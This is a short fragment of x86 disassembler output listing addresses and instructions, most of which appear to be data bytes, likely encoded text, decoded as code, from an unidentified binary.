  42a656:	add    BYTE PTR [edi+0x0],bl
  42a659:	xor    BYTE PTR [eax],al
  42a65b:	inc    edi
  42a65c:	add    BYTE PTR [ebx],dh
  42a65e:	add    BYTE PTR [eax+eax*1+0x0],dl
  42a662:	add    BYTE PTR [edi+0x0],al
  42a665:	xor    BYTE PTR [eax],al
  42a667:	dec    ebx
  42a668:	add    BYTE PTR [edi+0x0],bl
  42a66b:	aaa    
  42a66c:	add    BYTE PTR [ebp+0x0],dl
  42a66f:	inc    ebx
  42a670:	add    BYTE PTR [ebp+0x0],cl
  42a673:	dec    ebx
  42a674:	add    BYTE PTR [edi+0x0],bl
  42a677:	xor    al,0x0
  42a679:	inc    ebp
  42a67a:	add    BYTE PTR [ebx+0x0],al
  42a67d:	add    BYTE PTR [eax],al
  42a67f:	dec    edx
  42a680:	add    BYTE PTR [esi+0x0],al
  42a683:	inc    esp
  42a684:	add    BYTE PTR [edi+0x0],bl
  42a687:	inc    esi
  42a688:	add    BYTE PTR [edx+0x0],dl
  42a68b:	push   edx
  42a68c:	add    BYTE PTR [ebx+0x0],dl
  42a68f:	add    BYTE PTR [eax],al
  42a691:	add    BYTE PTR [edx+0x53],dl
  42a694:	inc    esp
  42a695:	push   ebx
  42a696:	jne    0x42a61d
  42a698:	pop    ds
  42a699:	lods   eax,DWORD PTR ds:[esi]
  42a69a:	adc    BYTE PTR ds:0x579444b7,bh
  42a6a0:	xor    eax,0x68eeedec
  42a6a5:	int3   
  42a6a6:	adc    al,0x0
  42a6a8:	add    BYTE PTR [eax],al
  42a6aa:	push   eax
  42a6ab:	cmp    bl,BYTE PTR [edx+edi*2+0x73]
  42a6af:	outs   dx,DWORD PTR ds:[esi]
  42a6b0:	inc    esi
  42a6b1:	outs   dx,BYTE PTR ds:[esi]
  42a6b2:	gs jne 0x42a729
  42a6b5:	fs addr16 jns 0x42a733
  42a6b9:	gs pop esp
  42a6bb:	outs   dx,BYTE PTR ds:[esi]
  42a6bc:	jne    0x42a72a
  42a6be:	dec    eax
  42a6bf:	push   esp
  42a6c0:	imul   ebp,DWORD PTR [ebp+0x6d],0x7a684a4d
  42a6c7:	pop    esp
  42a6c8:	jo     0x42a71a
  42a6ca:	dec    esi
  42a6cb:	jno    0x42a71c
  42a6cd:	inc    ecx
  42a6ce:	js     0x42a732
  42a6d0:	jno    0x42a747
  42a6d2:	push   0x702e6b76
  42a6d7:	bound  eax,QWORD PTR fs:[eax]
